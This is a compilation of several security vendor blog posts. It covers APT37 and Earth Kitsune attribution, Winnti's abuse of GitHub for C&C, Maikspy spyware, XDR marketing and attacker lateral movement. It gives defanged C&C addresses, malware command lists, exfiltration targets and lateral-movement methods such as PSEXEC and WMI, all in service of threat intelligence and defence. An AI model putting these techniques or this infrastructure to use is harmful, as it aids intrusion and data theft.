"What got our attention is that the samples were renamed to be similar to the naming convention of Windows update files (i.e., “Windows-KB275122-x86.exe”)."
"While analyzing the samples that have been previously attributed to APT37, we noticed that the persistence mechanism in Operation Earth Kitsune uses the same naming convention to auto-start itself through the Windows run registry key."
We also found that older samples from the previous SLUB campaigns in 2019 used a similar naming convention.
"Figure 9 shows that SLUB used “Windows-RT-KB-2937636.dll,” while Freenki used “Windows-KB275122-x86.exe.” Figure 9 Naming convention for persistence."
"We can see how the Freenki malware, previous SLUB campaigns, and Operation Earth Kitsune share many common TTPs in their delivery and persistence mechanisms."
"However, these are not the only commonalities."
"Again, on its own, this might not be coincidental."
"However, our analysis shows further similarities that imply correlation."
GNUBoard compromised web sites
"In the blog describing Operation Earth Kitsune, we noted sites using the GNUBoard Content Management System (CMS) had been compromised and were used to host malware."
The malware campaigns previously attributed to APT37 also extensively used the exploitation of web sites hosted with GNUBoard CMS.
"While analyzing multiple samples, we found indicators of this strategy across the various campaigns."
Figure 10 shows an example attributed to APT37 and Operation Earth Kitsune as a comparison.
The SLUB campaign also exploited and used GNUBoard websites as part of the infrastructure.
Figure 10.
Websites created using GNUBoard CMS Exfiltration commands
"As mentioned in the previous report on Operation Earth Kitsune, one of the espionage backdoors, named agfSpy, received a “JSON” configuration with a list of native Windows commands to execute."
The output of those commands is exfiltrated back to the agfSpy command and control (C2) server.
"While analyzing one malware previously attributed to APT37, it executed practically the same command sequences including the paths and extensions."
"Even when the threat actor was not using the “JSON” format, the commands embedded in the various samples show a surprising amount of similarities."
Figure 11 shows a comparison of the exfiltration commands between malware previously attributed to APT37 and Operation Earth Kitsune.
Note the following similarities: The usage of paths C:\Users and D:\ are similar The searching patterns are very similar The extension list is very similar
"Note that we are comparting a sample from 2016 with agfSpy, which is from 2020."
It makes sense that new campaigns coming from the same authors/groups will add new extensions like “.xlsx” to support updated versions of Office documents.
It is also clear that the actual interest is on the “.hwp” extension for Korean Office document listing support during exfiltration.
Figure 11. Exfiltration command similarities. Code sharing
"When doing attribution, finding code sharing between different samples is one of the most desired discoveries."
"However, in our case, this was difficult as we are comparing samples from 2016-2017 to those developed in 2020."
"At the same time, practically all code for the SLUB malware was created from scratch."
"Also, dneSpy and agfSpy are based on custom and newly developed code."
"That makes it difficult to match code similarities, and that is why many of the indicators of code sharing are sparse across different samples."
"However, one feature that is present in the previous malware attributed to APT37 and Operation Earth Kitsune is the screenshot capture."
We tried to find how this feature evolved across previous samples and the older SLUB samples.
"During the analysis, we found a clear indication of code sharing for the screenshot functionality."
Figure 12 shows a comparison between the two samples.
"While this code may have some related “internet code sharing post” origin, both samples share it."
"They also have some changes that make sense, such as removing the error “failed to take…,” since this is not required for the malware functionality."
It is likely a late refactor to the code.
Figure 12.
Screenshot functionality comparison between SLUB and APT37 Working Hours
Analyzing the compile time of binaries between different samples can also provide a level of correlation between samples.
"While malware authors can fake this, useful information can still be gleaned with enough samples."
"In our case, we collected many samples across 2020, and we found that the compile dates and times follow a logical timeline according to the malicious activity."
"Based on our analysis, we believe the malware author did not fake the compile times of the binaries."
Other public references also used the compiled binary time of samples attributed to APT37.
"When compared to the compile times seen in Operation Earth Kitsune, there are several similarities."
The compile times that are listed on binaries provide an estimate of the threat actor's working hours and help approximate possible time zones where the malware was developed.
It is fair to assume that the developers work on daily working times.
"When you have many samples to analyze, you can refine that expectation over time."
Figure 14 (below) shows a raw comparison across many samples using two time zones.
We can see how the UTC+9 time zone matches those previously attributed to APT37 and those from Operation Earth Kitsune.
These both equate to the daily working times for that time zone.
Figure 13.
Compile Time APT73 and Kitsune
"During the capture of samples for Operation Earth Kitsune, we managed to dump information about the Mattermost server using its API and the token used by the malware itself."
Mattermost was being used as a C2 channel for the malware.
Part of the dumped information contained the action of the user with administration roles on the system.
That user was doing manual activities the majority of the time.
"At the same time, we were able to locate the Mattermost server hosted in Greece, and that gave us the current time zone of the Mattermost server."
"Having that reference, we plotted the actions of all users whose information we could obtain."
"It is important to remember that, except for the administrator user, all other accounts were used as part of the malware deployment (SLUB malware)."
Figure 15 shows a plot with “Y” representing the number of actions.
"For example, an action for the SYSTEM_ADMIN could be to create a user, add a user to a channel, etc."
The “X” axis represents the hour of the day (in 24 hours).
"No months are plotted, so this figure is like compressing all the activity across the full 2020-year in one day just to show the active hours in a day."
All the plots are located in UTC+9.
Figure 14.
Mattermost server activity.
Figure 15 shows that User_3 and User_4 have like random counts.
This is because those accounts are actually the ones the malware used during the infection logging activities to the Mattermost server.
"However, the SYSTEM_ADMIN account has a different pattern because the actions are mostly due to manual administration activities."
"Unsurprisingly, the SYSTEM_ADMIN hours perfectly line up with the daily working hours at UTC+9."
Conclusions
"While no attribution is perfect, there are striking similarities between the malware attributed to APT37 and Operation Earth Kitsune."
"Little can be gleaned from each individual piece, but when viewed as a whole, the group behind Operation Earth Kitsune is likely the same one behind the Freenki malware and other malware campaigns attributed to APT37."
"This is somewhat surprising, considering Operation Earth Kitsune’s espionage tools were entirely fresh-developed."
"We can summarize the correlated indicators in a general form as: Use of Korean language in the system environment of the developers Reuse of multiple TTPs during operation deployments: GNUBoard compromised web sites Multiple malware samples deployed at the same time A similar organization in the deployment architecture Reliance on public services and watering hole attacks to compromised victims Some code reuse, even when the samples are completely different otherwise Working hours for both matches"
"Exfiltration techniques and information interest are very similar if not fully matched While it is always possible for another group to imitate the TTPs of a different group to confuse attribution, there does not seem to be any indication of that here."
"Instead, what we see in SLUB and Operation Earth Kitsune is the evolution of an advanced threat actor over time: one that builds on what worked in the past to become more efficient in the present."
"Tags Articles, News, Reports | APT & Targeted Attacks | Research"
"Cybercriminals and malicious hackers have been shifting their tactics, techniques, and procedures (TTPs) to improve their ability to infiltrate an organization and stay under the radar of security professionals and solutions."
"Moving to more targeted attack methods appears to be a mainstay among threat actors, which requires organizations to improve their visibility into the entire attack lifecycle."
"Gone are the days in which these attacks only target the endpoint, and as such, an expanded connected threat defense is paramount."
Many organizations have been adopting EDR (Endpoint Detection & Response) as a way to obtain more data about attacks on the endpoint.
"But as we’ve seen with even ransomware actors, the endpoint is being targeted less."
"Rather, attacks are laterally moving within an organization to find critical systems that will allow them to increase their chance of the organization paying the ransom."
(See my recent webinar on trends in ransomware.)
"This means the actors behind many financially motivated and targeted attacks will move across the network, and their tracks will be left in other areas of their network, not just on the endpoint."
Expanding EDR to include other areas is the definition of XDR.
"The X could be network data, email or web data, data from cloud instances, and others."
"This would allow an organization to get visibility into the entire attack lifecycle, including infiltration, lateral movement, and exfiltration."
This will improve the organization’s ability to prevent critical data exfiltration or the compromise of critical systems within their network.
"The ability to do this requires a number of key components: A security vendor who has solutions across the entire network, including cloud, gateway (email & web), network, server, endpoint (includes mobile), and IoT/IIoT Support for threat intelligence and data analytics."
"This should be as automated as possible and should include 3rd party threat intelligence (i.e. CERT, ISAC, ISAO feeds) History of expertise in correlating multiple threat vectors and the use of AI and Machine Learning"
"This will require a major shift from traditional security practices, as many organizations have supported a best-of-breed approach, utilizing multiple vendors (some say 50-100 security applications on average within a large enterprise)."
"Instead, the future is moving to a more consolidated approach with fewer vendors."
"Having multiple vendors for different areas of security results in silos and segmentation due to a lack of integration across the security industry, but XDR could bring a shift in this practice as they include more support for 3rd party intelligence feeds."
Trend Micro has been innovating for 30 years and our breadth of security products allows us to successfully build an XDR solution.
"Also, our almost 15 years of investing in and building AI/Machine Learning technologies into our backend and frontend products will allow us to have the data analytics piece covered."
"Lastly, we have an extensive array of global threat intelligence that will allow us to ensure we can proactively detect and protect our customers."
Stay tuned for more information about this topic in upcoming blogs.
Tags Cloud | Malware | APT & Targeted Attacks | Cyber Crime | Expert Perspective
"On March 8, President Biden signed an Executive Order to ban the sale of Russian oil, liquefied natural gas and coal to the United States."
"With bipartisan support, the decision was made to deprive the Putin regime of the economic resources needed to wage war in Ukraine."
"However, marking as it does an escalation in punitive actions directed at the Russian state, it may also put US companies more directly in the firing line of cyber-attacks from the east."
Leaders of the U.S. intelligence community expressed this same concern in their annual appearance on capitol hill on Tuesday.
"The Director of National Intelligence Avril Haines said “Nevertheless, our analysts assess that Putin is unlikely to be deterred by such setbacks and instead may escalate, essentially doubling down.”"
The good news is that best practice cybersecurity advice does not need to change.
"If the security and intelligence community continues to come together to share what information we have on offensive Russian cyber activity, and customers have the right detection and response tools in place, organizations can maintain a strong defensive posture."
Waiting for the tipping point
"To date, the scale of Russian state-sponsored and proxy cyber-attacks has not been as expected."
"Yes, we’ve seen continuous DDoS attacks, a campaign of web defacements and various iterations of wiper malware."
But these efforts have been mainly targeted at Ukrainian organizations.
Reports suggest tens of thousands of cybersecurity professionals there have enlisted as volunteers to help the country’s efforts.
Hacking collective Anonymous has also claimed responsibility for multiple hacktivist attacks in Russia.
"However, following the Presidential EO this week, we could well see Russian APT groups or their proxies expand their targeting of U.S. critical infrastructure."
"Oil and gas, banking and defense sectors are most likely to top of the list of targets."
"What we can expect If this kind of escalation were to take place, it may begin through deployment of known destructive malware like IsaacWiper, HermeticWiper and WhisperKill onto already compromised targets or systems known to be vulnerable."
"Follow-on phases would see the use of DDoS or other volumetric, availability-based attacks against systems that couldn’t be compromised in the first round of attacks."
Zero-day vulnerabilities held in reserve could be exploited during this phase.
"Alongside the threat from Russian state hackers, Putin may call upon the “patriotic” reserves of the numerous cybercrime groups operating from within the country."
Already the Conti and Lockbit ransomware collectives have stated their support.
"However, Conti was forced to equivocate its language after a Ukrainian researcher doxxed the group with a devastating leak of source code and other internal information."
"Although they may not have a choice if called upon to support the Kremlin, this incident will certainly give many Russian ransomware actors a reason to think twice about joining the war effort."
"Fighting back If the worst-case scenario does unfold and US organizations are attacked en masse, normal rules of best practice cybersecurity apply."
"First comes continuous risk-based patching, multi-factor authentication, network monitoring, least privilege access, data encryption, phishing awareness training, and other cyber-hygiene steps."
"But on top of that, organizations must have the detection and response tooling, ideally XDR, to correlate, prioritize and act on high fidelity alerts with speed and precision."
"The security community, including government agencies, should quicken their pace in sharing actionable intelligence, in order to improve public and private organizations’ threat hunting and detection efforts."
Security operations (SecOPs) leaders may also want to: Expand training and awareness for their users and partners; Collect telemetry from sources not traditionally aligned with cyber such as supply chain vendor management.
"Increase attack surface enumeration across IoT, Industrial IoT, mobile and cloud; Expand or deploy a zero trust architecture framework and; Fortify your backups"
"Tags Expert Perspective | Web | Exploits & Vulnerabilities | Cyber Threats | APT & Targeted Attacks | Articles, News, Reports | Network"
With additional analysis from Cyber Safety Solutions Team Developers constantly need to modify and rework their source codes when releasing new versions of applications or coding projects they create and maintain.
This is what makes GitHub—an online repository hosting service that provides version control management—popular.
"In many ways, it’s like a social networking site for programmers and developers, one that provides a valuable platform for code management, sharing, collaboration, and integration."
"GitHub is no stranger to misuse, however."
"Open-source ransomware projects EDA2 and Hidden Tear—supposedly created for educational purposes—were hosted on GitHub, and have since spawned various offshoots that have been found targeting enterprises."
Tools that exploited vulnerabilities in Internet of Things (IoT) devices were also made available on GitHub.
"Even the Limitless Keylogger, which was used in targeted attacks, was linked to a GitHub project."
"Recently, the Winnti group, a threat actor with a past of traditional cybercrime -particularly with financial fraud, has been seen abusing GitHub by turning it into a conduit for the command and control (C&C) communications of their seemingly new backdoor (detected by Trend Micro as BKDR64_WINNTI.ONM)."
Our research also showed that the group still uses some of the infamous PlugX malware variants—a staple in Winnti’s arsenal—to handle targeted attack operations via the GitHub account we identified.
Malware Analysis
"The malware we analyzed is separated in two files: a loader, and the payload."
"The loader, named loadperf.dll, is a modified version of its legitimate, similarly named counterpart—a Microsoft file which helps manipulate the performance registry."
An extra component has been added to its sections.
It copies itself on %WINDIR%\system32\wbem\ and replaces the original DLL.
"It leverages the WMI performance adapter service (wmiAPSrv), a legitimate file in Windows that collects information related to system performance, to import the loader via services.exe."
The system also imports all related DLL files and includes the payload “loadoerf.ini”.
"The infection chain includes an additional (albeit empty) function imported from loadoerf.ini, gzwrite64, which works as a fake Application Program Interface (API) that serves as the payload’s entry point."
"Although gzwrite64 is imported by loadperf.dll, the payload’s main function is actually located in the DLLMain of “loadoerf.ini”."
Figure 1: Extra section .idata added to the original loadperf.dll Figure 2: Extra imported function gzwrite64
"The payload is a file named loadoerf.ini that contains decryption, run, and code injection functions."
"When it is loaded by the system, DLLMain decrypts the payload via CryptUnprotectData."
"Since the function highly depends on the actual “machine ID”, decryption on another machine that isn’t the original infected host is not viable, making malware analysis more difficult."
Figure 3: Part of the decryption function used in the payload
"After decryption, partial code is run on the machine, which is then injected to svchost.exe (a key Windows component); payload is then loaded into memory."
Figure 4: Execution/infection flow of loadoerf.ini
How is GitHub abused?
"Upon successful infection, the malware starts communicating with an HTML page from a repository stored in a GitHub project."
Figure 5: GitHub account hosting an HTML page used for C&C communication
Any malware threat analyst will immediately recognize Line 3 in the image above as a potential PlugX-encrypted line.
"The beginning and end markers, DZKS and DZJS, are typical in PlugX. A closer look, however, shows that the decryption algorithm is different from PlugX."
"In this case, decrypting them reveals references to its actual command and control (C&C) server: an IP address and a port number the malware will connect to."
Winnti currently uses different encryption algorithms to store those C&C references in the files they stored on Github.
Among them is an algorithm utilized by PlugX.
"In fact, we found references to PlugX in the C&C strings we analyzed, indicating that the group may also be using the same backdoor in this particular campaign."
"Although we were unable to find a PlugX sample through that particular GitHub, we surmise some PlugX variants in the wild use this GitHub repository to get their C&C information."
Nearly all the other algorithms used in this GitHub campaign are derived from the original PlugX algorithm: PlugX style + shift string + Base64 PlugX style + shift string + Base64 + XOR PlugX style + Base64 + XOR One algorithm is also built in mark strings + shift string + Base64 encoding.
Following Winnti's Trails The GitHub account used by the threat actor was created in May 2016.
"It created one legitimate project/repository (mobile-phone-project) in June 2016, derived from another generic GitHub page."
The repository for Winnti’s C&C communications was created on August 2016.
"We surmise that the GitHub account was not compromised, and instead created by Winnti."
"By March 2017, the repository already contained 14 different HTML pages created at various times."
Timeline of the Campaign
We mapped Winnti’s activities for this campaign by analyzing the dates exposed in GitHub.
"For each file, GitHub stores first-and-last commit timestamps; these enabled us to create a timeline of the first use of the group’s many C&C servers."
We monitored the period during which IP addresses were found connecting to Winnti’s C&C servers and found that they started their operations in the afternoon up to late evening.
"The timetable resembles traditional working hours for cybercriminals, compared to those with less structure who prefer starting their days late, but also working until very late hours."
"In fact, we only observed one instance of activity during the weekend, where a new HTML file was created."
"The earliest activity we tracked on the GitHub account was from August 17, 2016, with the most recent in March 12, 2017."
"Here is a timeline of when the C&C server’s IP addresses were first used, based on our monitoring: Figure 6: Timeline of the C&C server’s IP addresses C&C Servers"
"The GitHub account used by Winnti shows 12 different IP addresses, with various port numbers used for them."
"All communication to these C&C servers are done on three different port numbers: 53 (DNS), 80 (HTTP), and 443 (HTTPS)."
These are typical techniques PlugX and Winnti malware variants use to communicate between compromised machines and their C&C servers.
"Nearly all the C&C servers are hosted in the U.S., while two are located in Japan."
"C&C Server's IP Address Port Number 160[.]16[.]243[.]129 443 (HTTPS) 160[.]16[.]243[.]129 53 (DNS) 160[.]16[.]243[.]129 80 (HTTP) 174[.]139[.]203[.]18 443 (HTTPS) 174[.]139[.]203[.]18 53 (DNS) 174[.]139[.]203[.]20 53 (DNS) 174[.]139[.]203[.]22 443 (HTTPS) 174[.]139[.]203[.]22 53 (DNS) 174[.]139[.]203[.]27 53 (DNS) 174[.]139[.]203[.]34 53 (DNS) 174[.]139[.]62[.]58 80 (HTTP) 174[.]139[.]62[.]60 443 (HTTPS) 174[.]139[.]62[.]60 53 (DNS) 174[.]139[.]62[.]60 80 (HTTP) 174[.]139[.]62[.]61 443 (HTTPS) 61[.]195[.]98[.]245 443 (HTTPS) 61[.]195[.]98[.]245 53 (DNS) 61[.]195[.]98[.]245 80 (HTTP) 67[.]198[.]161[.]250 443 (HTTPS) 67[.]198[.]161[.]250 53 (DNS) 67[.]198[.]161[.]251 443 (HTTPS) 67[.]198[.]161[.]252 443 (HTTPS) Figure 6: IP addresses used for C&C communication, and the port numbers they use"
We have privately disclosed our findings to GitHub prior to this publication and are proactively working with them about this threat.
Conclusion
"Abusing popular platforms like GitHub enables threat actors like Winnti to maintain network persistence between compromised computers and their servers, while staying under the radar."
"Although Winnti may still be employing traditional malware, its use of a relatively unique tactic to stay ahead of the threat landscape’s curve reflects the increased sophistication that threat actors are projected to employ."
Related Hashes (SHA256) detected as BKDR64_WINNTI.ONM: 06b077e31a6f339c4f3b1f61ba9a6a6ba827afe52ed5bed6a6bf56bf18a279ba — cryptbase.dll 1e63a7186886deea6c4e5c2a329eab76a60be3a65bca1ba9ed6e71f9a46b7e9d – loadperf.dll 7c37ebb96c54d5d8ea232951ccf56cb1d029facdd6b730f80ca2ad566f6c5d9b – loadoerf.ini 9d04ef8708cf030b9688bf3e8287c1790023a76374e43bd332178e212420f9fb — wbemcomn.ini b1a0d0508ee932bbf91625330d2136f33344ed70cb25f7e64be0620d32c4b9e2 — cryptbase.ini e5273b72c853f12b77a11e9c08ae6432fabbb32238ac487af2fb959a6cc26089 — wbemcomn.dll Tags Malware | APT & Targeted Attacks | Endpoints | Research
We discovered a malware family called Maikspy — a multi-platform spyware that can steal users’ private data.
"The spyware targets Windows and Android users, and first posed as an adult game named after a popular U.S.-based adult film actress."
"Maikspy, which is an alias that combines the name of the adult film actress and spyware, has been around since 2016."
"Our analysis of the latest Maikspy variants revealed that users contracted the spyware from hxxp://miakhalifagame[.]com/, a website that distributes malicious apps (including the 2016 adult game) and connects to its C&C server to upload data from infected devices and machines."
Multiple Twitter handles were found promoting the adult game called Virtual Girlfriend and sharing the malicious domain via short links.
Figure 1. Tweets that mention Virtual Girlfriend and the short link of hxxp://miakhalifagame[.]com/ Maikspy on the Android platform Figure 2.
Infection chain of Maikspy Android variant
"Based on the analysis of samples that were last seen in the wild in March 2018, the Maikspy variant (detected by Trend Micro as AndroidOS_MaikSpy.HRX) that runs on Android poses as Virtual Girlfriend to lure users into visiting the attackers’ malicious domain."
"When users open the short link version of the domain shared on Twitter, a page that shows gender option buttons will appear followed by a page that will let users choose their “first girlfriend” and lead them to the download page."
Figure 3.
Virtual Girlfriend’s option buttons (first and second screen from the left) and download page (third screen)
"When the downloaded APK file is installed and launched, it will send the infected device’s Unix timestamp to 0046769438867, a phone number containing Sweden’s code."
This is presumably used for the device’s ID registration: Figure 4.
"Code snippet of the device’s Unix timestamp being sent to 0046769438867 Subsequently, the Maikspy-carrying app will display ""Error: 401. App not compatible."
Uninstalling
...
as an attempt to deceive the user into thinking that the app is already removed from the device.
"However, the spyware just hides itself and runs in the background."
"There, the malicious app first checks the required permissions and then proceeds with its routine: Steal phone number Steal accounts Steal installed app list Steal contacts Steal SMS The stolen information will be either written into .txt or .csv formats before being uploaded to the C&C server."
"After fetching and uploading the abovementioned stolen data, the malicious app will check the command (CMD) from the C&C server every 60 seconds."
"The following are the supported commands: CMD Details startrecording Start recording the sound around the device stoprecording Stop recording uploaddata Upload /sdcard/DCIM,/sdcard/Downloads, /sdcard/Movies, /sdcard/Pictures, /sdcard/Documents files getnumber Get and upload phone number getclipboard Get and upload clipboard contents sms- Send SMS get- Get and upload dedicated files getcontacts Get and upload Contacts getinstalledapps"
Get and upload installed APP list getmsgdata Get and upload received SMS getmsgdatasent Get and upload sent SMS getaccounts
Get and upload Accounts tree
Get and upload dedicated directory file list
"In the first launch of Virtual Girlfriend, the malicious app will use a combination of the Unix timestamp, the device’s Bluetooth adapter name, and the name of user’s Twitter account as device identification name: Timestamp_BTAdapterName_TwitterAccount."
"If the user doesn’t have the Twitter app, it will just be a null string (“”)."
"If the user has multiple Twitter accounts, the spyware will use the account where the user is logged in."
Figure 5.
"Code snippet of the process where the Unix timestamp, the device’s Bluetooth adapter name, and the name of user’s Twitter account are combined to produce a device identification name"
"Additionally, the spyware will open hxxp://miakhalifagame[.]com/get_access2[.]php when first installed."
It will display the page below.
Figure 6.
"The spyware displays the online dating scam website upon the installation of the malicious Virtual Girlfriend app What will be shown is the registration page of an online dating site, which will lure users into giving out their credit card information."
"When users register, their credit cards will be charged."
This happens when the data is uploaded with the hidden iframe found in the bottom right part of the page (underlined in red).
"As a result, the attackers behind the scheme will not only obtain the credit card information of the victim, but also steal any money charged to the credit card, so long as the user doesn’t request a chargeback."
Maikspy on the Windows platform Figure 7.
Infection chain of Maikspy Windows variant Figure 8.
These buttons greeted users who clicked the Twitter short link of hxxp://miakhalifagame[.]com/
"In the case of the Windows variant (WORM_INFOKEY.A) of Maikspy last seen in April 2017, the user will be tricked into downloading a MiaKhalifa.rar file, which contains the files seen in the screenshot below:"
Figure 9.
"Content of the MiaKhalifa.rar file README.txt provides instructions teaching the user how to turn off the anti-virus software and how to turn on the network, which the attacker needs to steal and upload data to its C&C server."
Figure 10.
Content of README.txt register.bat is used to gain administrator privilege.
Figure 11.
Code snippet of register.bat Uninstall.exe is a copy of the open-source hacking tool Mimikatz (https://github[.]com/gentilkiwi/mimikatz).
"It has the ability to extract plaintext passwords, hash, PIN code, and Kerberos tickets from memory."
"Here, Uninstall.exe is used to get the Windows account and password, and then writes the result to C:\Users\%username%\AppData\local\password.txt."
Setup.exe is the core module used to steal data.
"Like the Android Maikspy, it first sends a notification to its C&C server to register the device."
Figure 12.
Code snippet of notification being sent to the C&C server to register the device
"After that, it fetches .jpg, .jpeg, .png, .txt, .wav, .html, .doc, .docx and .rtf files from the following directories: C:/Users/%username%/Desktop, C:/Users/%username%/Pictures, C:/Users/%username%/Documents, and C:/Users/%username%/Downloads."
File lists of the directories are also stolen.
"Subsequently, it writes them into files before uploading it to the C&C server."
Figure 13.
"Code snippets of the scanning, fetching, and uploading of .jpg, .jpeg, .png, .txt, .wav, .html, .doc, .docx and .rtf files (left)."
"It also steal information about the machine’s system i.e. default browser, OS version, Firefox version, Chrome version, IE version and Network configuration (right)."
We also stumbled upon a Chrome extension plugin (VirtualGirlfriend.crx) that Windows users can contract upon visiting hxxp://miakhalifagame[.]com.
"When the extension plugin (BREX_INFOSTEAL.A) is downloaded, the victims will be instructed how to load it into the browser."
"After that, the malware will collect the username and password inputs from web pages and sends it to hxxps://miakhalifagame[.]com/testinn[.]php."
Figure 14.
Instructions given to the user on how to load the malicious Chrome extension Figure 15.
Code snippet of the malicious extension plugin Connection between Round Year Fun and Maikspy
We looked into one of the Twitter accounts (seen in Figure 1) that promoted Virtual Girlfriend.
"The name of the Twitter account is Round Year Fun (hxxps://twitter[.]com/RoundYear_Fun), and its homepage is full of tweets that promote games from hxxp://www[.]roundyearfun[.]org."
Figure 16.
Twitter homepage of Round Year Fun hxxp://www[.]roundyearfun[.]org is a portal that promotes games on Twitter.
"As seen in the figure below, it also has other games aside from Virtual Girlfriend."
"Upon checking the cached version of the page, we discovered that it was also used to distribute the adult game first used by the attackers behind Maikspy."
Figure 17.
Virtual Girlfriend in the list of games advertised by hxxp://www[.]roundyearfun[.]org Figure 18.
The adult game first used by the attackers was also found in the list of games advertised by hxxp://www[.]roundyearfun[.]org Our analysis revealed that hxxp://www[.]roundyearfun[.]org was also used as a C&C address to save victims’ data.
The malware also shares the same certification with Virtual Girlfriend.
One of the samples was sourced from hxxp://roundyearfun[.]org/noavi/MiaKhalifa[.]apk.
"Interestingly, we discovered an image that shows the logo of Round Year Fun, found at hxxp://miakhalifagame[.]com/img/ryf[.]jpg."
Figure 19. Round Year Fun logo found at Maikspy’s malicious domain
"Based on these findings, it’s possible that the attackers behind Maikspy operate //www[.]roundyearfun[.]org/ and hxxp://miakhalifagame[.]com/."
"Another thing that we discovered about the games offered by Round Year Fun is that if you authorize it to use your Twitter account, the author can use the account to promote games using automation tools."
"The author used the other Twitter handle in Figure 1, rifusthegr8, to tweet about Virtual Girlfriend and retweet Round Year Fun’s own Twitter promotion of the game."
History of Maikspy from 2016 to 2018
The first variant of Maikspy appeared on the Windows platform in December 2016.
It disguised itself as the adult game named after an adult film actress.
"It has the ability to update itself from hxxp://fakeomegle[.]com/, and steal .jpg, .jpeg, .png, .txt, .wav, .html, .doc, .docx and .rtf files located in the Desktop, Picture, Documents, and Downloads folders, as well as information about the machine’s Internet Explorer, Chrome, Firefox or default browsers, OS, and network configuration."
The spyware connects to 107[.]180[.]46[.]243.
"Meanwhile, the first Android variant of this spyware family appeared in January 2017."
It was also under the guise of the previously mentioned adult game and still connects to the aforementioned C&C server.
"It was capable of recording phone calls and stealing information such as the device’s location, SMS, contacts, WhatsApp database, and record sound around the affected device."
"The next variant appeared quickly, and it added the following abilities to its routines: Steal information about the device’s clipboard, phone number, installed app list, and accounts."
"Meanwhile, the ability to steal the WhatsApp database was removed."
It also changed its command format.
"In March 2017, another new variant appeared with the ability to steal photos when users take them using the camera."
"The code structure and package name also changed, as well as its C&C address: 198[.]12[.]155[.]84."
"It was in April 2017 when the last Windows variant of Maikspy appeared with the following changes: The C&C server was changed to 198[.]12[.]155[.]84, password theft is added, as well as the theft of .doc, .docx, and .rtf files."
"Between June and December 2017, the Android variant had the following alterations: C&C server was changed to 192[.]169[.]217[.]55, the ability to record phone calls was removed, and the C&C server was again changed to 198[.]12[.]149[.]13."
"In January 2018, the Android variant’s app label changed to Virtual Girlfriend."
"Two months later, the C&C server was changed to hxxp://miakhalifagame[.]com."
The attackers were found using the HTTP protocol to transfer data.
The ability to steal location and pictures was removed from its routine.
Relationship between variants and C&C servers used by Maikspy
"The attackers behind Maikspy have changed domains and IP addresses over the years, but all were found hosted in a publicly traded internet domain registrar and web hosting company in the U.S."
"The following figures show how Maikspy variants from 2016 to 2018 are connected to C&C servers (found in this appendix, along with the Android and Windows hashes) used by the attackers: Figure 20."
"The connection of Maikspy variants to 198[.]12[.]155[.]84, hxxp://roundyearfun[.]org/, and 192[.]169[.]217[.]55."
"Note: The green nodes represent Android samples, while the blue nodes represent Windows samples."
Figure 21. Connection of Maikspy variants to 107[.]180[.]46[.]243 and hxxp://fakeomegle[.]com Figure 22. Connection of Maikspy variants to 198[.]12[.]149[.]13and hxxp://miakhalifagame[.]com/
Countermeasures
Downloading only from legitimate app stores like Google Play can prevent Maikspy from compromising computers and mobile devices.
"It is also important to be aware of what apps are allowed to access, and to understand the risks before accepting any terms or granting certain permissions to apps."
Trend Micro’s Mobile App Reputation Service (MARS) already covers Android and iOS threats using leading sandbox and machine learning technology.
"It can protect users against malware, zero-day and known exploits, privacy leaks, and application vulnerability."
End users and enterprises can also benefit from multilayered mobile security solutions such as Trend Micro™ Mobile Security for Android™ which is also available on Google Play.
"For organizations, Trend Micro™ Mobile Security for Enterprise provides device, compliance and application management, data protection, and configuration provisioning, as well as protects devices from attacks that leverage vulnerabilities, preventing unauthorized access to apps, as well as detecting and blocking malware and fraudulent websites."
"The Trend Micro™ Deep Discovery™ threat protection platform enables companies to detect, analyze, and respond to modern threats such as sophisticated malware, targeted attacks, and APTs."
"Trend Micro™ Smart Protection for Endpoints with Maximum XGen™ security infuses high-fidelity machine learning into a blend of threat protection techniques to eliminate security gaps across user activity and any endpoint—the broadest possible protection against advanced attacks. Tags APT & Targeted Attacks | Endpoints | Research | Mobile | Articles, News, Reports | Network"
Real enterprises are messy places.
One messy reality is that enterprises don’t manage all their endpoints.
A smart colleague turned me onto using the % of endpoints and servers managed as a prime security metric.
On one end of the spectrum are places like universities that maybe manage 10% of the endpoints on their network.
On the other end are places like some large banking and R&D companies that can manage about 98 or 99%.
"A financial services company that was spending millions of dollars on getting from 96% to achieving 98%, using the very good reasoning that they were “cutting their biggest security problem in half” rather than “2%, meh.” So even the very best enterprises can have unmanaged endpoints that can be more easily exploited than ones with a security agent deployed on them."
A lot of the advanced security we’ve been delivering on the last few years has been focused on this problem.
EDR is an example of how stealthy or evasive attackers can be better uncovered than with traditional endpoint protection.
EDR is great for endpoints they are on.
Ian Loe of NTUC gives a killer example of uncovering stealthy attacks using EDR and MDR here.
But most of EDR’s capabilities are for endpoints they are on: ones they manage.
Sure there’s some herd-immunity with EDR that the greater number of managed endpoints the harder it is for an attacker to move laterally or deeper.
"But more capable, patient, and stealthy attackers are getting better at being evasive, knowing that EDR may be or is deployed."
Mark Nunnikhoven does a great job in this post talking about lateral movement.
"EDR can only go so far on its own to help spot attacks that are exceptionally low and slow, and/or using unmanaged endpoints."
Endpoint security needs to step outside the endpoint silo to keep step with advanced attackers.
"An attack using many hops could see movement between managed endpoints, IoT, email, network components, containers and cloud-based servers over the course of many months."
"The delivery and reconnaissance could involve multiple protocols, emails, payloads, files, and credentials."
"Pulling together the tenuous and ephemeral threads of such an intentional attack needs more modern tools, rather than hoping we stumble on a supply of highly advanced threat hunters."
Pulling together deep security information from across your enterprise is what is needed to face off against such advanced and intentionally evasive attacks.
XDR is intended to be that security data lake of deeper enterprise infrastructure and security information than we’ve previously gathered in a single addressable pool and designed to be useful for threat hunters and analysts.
"In these posts here and here we talk about what XDR is and how it brings in more sources, such as network data."
"In the game of measure-countermeasure that is cybersecurity today and tomorrow, XDR is the next evolutionary step in dealing with more evasive threats."
"Malicious actors, once in an organization’s network, will need to move beyond their initial infection location to other parts of the network, seeking out areas that hold the data or critical systems they wish to utilize."
"Whether that is the data center, an OT network, or finding critical business systems to support their criminal or destructive intent."
"There are a number of ways lateral movement is performed, but the key is to hide and remove evidence of their presence."
Initially they will look to scan the internal network using similar scanning tools used by admins to identify what systems are available to them.
Hacking tools and keyloggers will be used to steal user accounts and passwords to obtain legitimate user credentials within systems.
More tools will typically be downloaded using the command & control infrastructure to help with their attack.
"After obtaining more powerful user accounts, the attacker can laterally move to other systems and use “normal” tools to perform other activities."
These activities may be difficult to identify for defenders due to the use of these things like: PSEXEC to execute a program from remote system Schedule a remote task to execute back door or malicious code RDP or net use to connect to other hosts
Leverage WMI for fileless intrusion Execute Powershell script for fileless intrusion
"Utilize exploits targeting unpatched systems for known vulnerabilities Execute normal tool like Bitlocker, to encrypt customer data like ransomware did."
But normal tools will not detect by antivirus system.
